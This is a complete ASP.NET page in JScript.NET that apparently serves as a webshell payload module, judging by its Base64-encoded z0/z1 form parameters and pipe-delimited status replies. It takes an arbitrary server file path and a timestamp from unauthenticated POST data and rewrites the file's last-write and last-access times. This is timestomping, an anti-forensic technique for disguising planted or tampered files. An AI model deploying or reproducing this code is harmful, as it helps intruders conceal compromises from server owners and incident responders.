<%

function GetCurrentCharset() : String {
    var charset : String = System.Web.HttpContext.Current.Response.Charset;
    if (charset == null || charset == "") {
        charset = "utf-8";
    }
    return charset;
}

function Base64Decode(str : String) : String {
    if (str == null || str.trim() == "") {
        return "";
    }
    try {
        var bytes : Byte[] = System.Convert.FromBase64String(str);
        var enc : System.Text.Encoding = System.Text.Encoding.GetEncoding(GetCurrentCharset());

        return enc.GetString(bytes);
    } catch(e) {
        return "";
    }
}

function UnixTimestampToDateTime(timestamp : double) : System.DateTime {
    var origin : System.DateTime = new System.DateTime(1970, 1, 1, 0, 0, 0, System.DateTimeKind.Utc);
    return origin.AddSeconds(timestamp).ToLocalTime();
}

function Main() {
    var z0 : String = System.Web.HttpContext.Current.Request.Form["z0"];
    var z1 : String = System.Web.HttpContext.Current.Request.Form["z1"];

    if (z0 == null || z1 == null || z0.trim() == "" || z1.trim() == "") {
        return "0|Missing parameters.";
    }

    var filename : String = Base64Decode(z0);
    var timestampStr : String = Base64Decode(z1);
    var timestamp : double = 0;

    try {
        timestamp = System.Double.Parse(timestampStr);
    } catch(e) {
        return "0|Invalid timestamp format.";
    }

    if (!System.IO.File.Exists(filename)) {
        return "0|File does not exist.";
    }

    try {
        var targetTime : System.DateTime = UnixTimestampToDateTime(timestamp);

        System.IO.File.SetLastWriteTime(filename, targetTime);
        System.IO.File.SetLastAccessTime(filename, targetTime);

        return "1|";
    } catch(e) {
        return "0|Failed to modify the timestamps. Error: " + e.message;
    }
}

Response.Write(Main());

%>